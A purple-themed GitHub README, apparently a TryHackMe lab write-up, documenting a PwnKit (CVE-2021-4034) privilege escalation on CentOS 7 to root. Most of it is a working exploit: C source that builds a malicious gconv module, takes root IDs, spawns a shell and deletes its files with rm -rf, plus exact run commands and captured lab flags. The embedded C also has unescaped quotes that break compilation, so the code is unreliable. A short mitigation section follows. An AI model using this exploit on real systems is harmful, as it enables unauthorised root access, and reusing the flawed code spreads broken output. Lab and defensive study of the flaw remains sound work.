<!-- Purple Cyberpunk Theme README for PwnKit (CVE-2021-4034) -->

<div style="background:#0b0820;padding:18px;border-radius:10px;color:#e6e6fa;">
  <h1 style="color:#c084fc;margin:0;">⚡ PwnKit (CVE-2021-4034) Privilege Escalation Walkthrough</h1>
  <p style="color:#d6bcfa;margin-top:6px;">Target: <strong>CentOS 7 / RHEL 7</strong> — Kernel <code>3.10.0-1160.el7.x86_64</code></p>
</div>

---

<div style="margin-top:12px;">
<img src="sandbox:/mnt/data/2090d524-19aa-4534-a625-7b3faf9033e1.png" alt="exploit-screenshot" style="max-width:100%;border-radius:6px;border:1px solid #2a2140;"/>
</div>

---

<div style="background:#130a28;padding:14px;border-radius:8px;color:#efe8ff;">
<h2 style="color:#a78bfa">🔍 Summary</h2>
<p>Proof-of-concept exploitation of <strong>PwnKit (CVE-2021-4034)</strong> using a GCONV loader technique that results in a root shell via <code>/usr/bin/pkexec</code>.</p>
</div>

---

## <span style="color:#b794f4">Environment</span>

- Host: `ip-10-49-141-37`  
- Kernel: `Linux 3.10.0-1160.el7.x86_64`  
- GCC: `4.8.5`  
- SELinux: unconfined (observed in output)

---

## <span style="color:#c4b5fd">Files created</span>

- `exp.c` — PoC wrapper that builds the gconv module and invokes `pkexec`  
- `pwnkit/pwnkit.c` — generated shared object code (gconv)  
- `exp` — compiled exploit binary

---

## <span style="color:#d6bcfa">Exploit source (exp.c)</span>

```c
/* PoC for PwnKit (CVE-2021-4034) — gconv loader injection */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n\n"
    "void gconv() {}\n"
    "void gconv_init() {\n"
    "   setuid(0); setgid(0);\n"
    "   seteuid(0); setegid(0);\n"
    "   system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");\n"
    "   exit(0);\n"
    "}";

int main(int argc, char *argv[]) {
    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
    FILE *fp = fopen("pwnkit/pwnkit.c", "w");
    fprintf(fp, "%s", shell);
    fclose(fp);
    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
    char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
    execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

---

## <span style="color:#b9a0ff">Step-by-step commands (exact)</span>

```bash
# 1. Create PoC and compile
nano exp.c
gcc exp.c -o exp

# 2. Run exploit (from vulnerable host)
./exp

# 3. Verify root
id
whoami

# 4. Find flags (example)
find /root /home /opt /var /tmp /etc -type f \( -name "flag*" -o -name "*flag*" -o -name "flag1.txt" \) 2>/dev/null
cat /home/missy/Documents/flag1.txt
cat /home/rootflag/flag2.txt
```

---

<div style="background:#1b0f2b;padding:12px;border-radius:8px;color:#efe8ff;">
<h3 style="color:#d6bcfa">✅ Results</h3>
<ul>
<li>Root shell obtained: <code>uid=0(root)</code></li>
<li>Flags captured:
  <ul>
    <li><code>/home/missy/Documents/flag1.txt</code> → <strong>THM-42828719920544</strong></li>
    <li><code>/home/rootflag/flag2.txt</code> → <strong>THM-168824782390238</strong></li>
  </ul>
</li>
<li>Exploit vector: <strong>pkexec (polkit)</strong> using gconv loader</li>
</ul>
</div>

---

## <span style="color:#c4b5fd">Notes & Mitigation</span>

- **Patch:** Upgrade polkit / pkexec to fixed versions (CVE-2021-4034 mitigation).  
- **Temporary fix:** remove or restrict `pkexec` access; ensure system libraries and packages updated.  
- **Defense:** Harden SELinux/AppArmor, monitor sudo/pkexec executions, use integrity monitoring.

---

## <span style="color:#b794f4">References</span>

- PwnKit advisory — Qualys: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034  
- Public PoCs: https://github.com/arthepsy/CVE-2021-4034

---

<div style="background:#0b0820;padding:10px;border-radius:6px;color:#bdb2ff;">
<small>Generated: Purple-themed PwnKit walkthrough — ready for GitHub README (uses inline HTML and styles).</small>
</div>
